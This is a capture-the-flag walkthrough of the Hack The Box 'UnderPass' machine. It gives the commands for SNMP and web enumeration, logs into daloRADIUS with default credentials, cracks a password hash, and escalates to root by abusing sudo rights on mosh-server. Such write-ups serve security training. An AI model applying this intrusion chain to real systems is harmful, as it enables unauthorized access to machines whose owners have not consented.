# :game_die: Htb Underpass Daloradius Mosh Server B1Ae3F5400B1

---

This is a Linux box. You can find it [here](https://app.hackthebox.com/machines/UnderPass).

You can watch the video walkthrough [here](https://youtu.be/PZFHGDK5xDQ).

Skill Learned

- Daloradius enumeration

- Mosh shell interaction

## NMAP

IP: 10.10.11.48

```
nmap -sT -p- --min-rate 10000 10.10.11.48 -Pn -oA nmap_ports
```

```
nmap -sC -sV -p 22,80 10.10.11.48 -Pn -oA nmap_ports_details
```

A quick UDP scan shows port 161

```
sudo nmap -sUV -T4 10.10.11.48 -oA nmap_ports_udp
```

## Port 80

Let’s visit port 80

Nothing much on port 80.

## Port 161

`snmpwalk` will dump the full SNMP information

```
snmpwalk -v 2c -c public 10.10.11.48
```

In addition to the description `nmap` printed, there’s an email address, `steve@underpass.htb`.

We can also see `"Underpass.htb is the only daloradius server in the basin!"`

## Daloradius

I’ll try visiting`/daloradius`, and there is a different response:

403 Forbidden is not the same as 404 Not Found. This is likely a directory in the web root folder on the server.

## Get anuragtaparia’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Let’s brute force directory enumeration

```
ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt -u "http://10.10.11.48/daloradius/app/FUZZ" -t 200
```

On fuzzing `/daloradius` , we found the `app` and `contrib` on fuzzing `/app` We found `operators`

On fuzzing `operators`, we found index.php, which redirects to login.php

## Foothold/shell

On a quick Google search, we found the [default credentials](https://cloudswit.ch/blogs/sonic-aaa-authentication-using-freeradius/#:~:text=After%20finishing%20all%20the%20steps,%2Fpassword%20is%20administrator%2Fradius) `administrator:radius`, and we are in the admin panel

## Shell as svcMosh

on` management -> list user` We found the hash for a user

The username is svcMosh, and there’s a 32 hex character password that is likely a hash. I’ll throw that into [CrackStation](https://crackstation.net/), and we’ll find the cracked password

Using the creds we are in

And we found user.txt

## Privilege Escalation

There are no other users with home directories in `/home`:

```
svcMosh@underpass:/home$ ls
svcMosh
```

Or users with shells configured:

```
svcMosh@underpass:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
svcMosh:x:1002:1002:svcMosh,60001,8675309,8675309:/home/svcMosh:/bin/bash
```

svcMosh can run `mosh-server` as any user using `sudo`:

```
sudo -l
```

From the mosh [document](https://mosh.org/), we can find

>

*Remote terminal application that allows roaming, supports intermittent connectivity, and provides intelligent local echo and line editing of user keystrokes.Mosh is a replacement for interactive SSH terminals. It’s more robust and responsive, especially over Wi-Fi, cellular, and long-distance links.Mosh is free software, available for GNU/Linux, BSD, macOS, Solaris, Android, Chrome, and iOS.*

There was a question (FAQ) that will help us run the mosh

>

*Q: How do I run the mosh client and server separately?*

According to that, we have to run

```
sudo /usr/bin/mosh-server
```

This will give a key and port number, We have to note the port number and key and run the mosh server on 127.0.0.1 (since it is locally hosted)

```
MOSH_KEY=<KEY> mosh-client <IP> <PORT>
```

And we are in as root

If you enjoyed this article and want to dive deeper into cybersecurity topics, feel free to explore my detailed write-ups on GitBook. I cover a range of topics, including vulnerability assessments, penetration testing techniques, and security methodologies.

👉 [Check out my GitBook for more insights](https://anuragtaparia.gitbook.io/write-ups)

👉 Watch my videos on YouTube: [AnuragSec](http://www.youtube.com/@AnuragSec)

Stay tuned for more content, and don’t forget to follow for future updates!

---
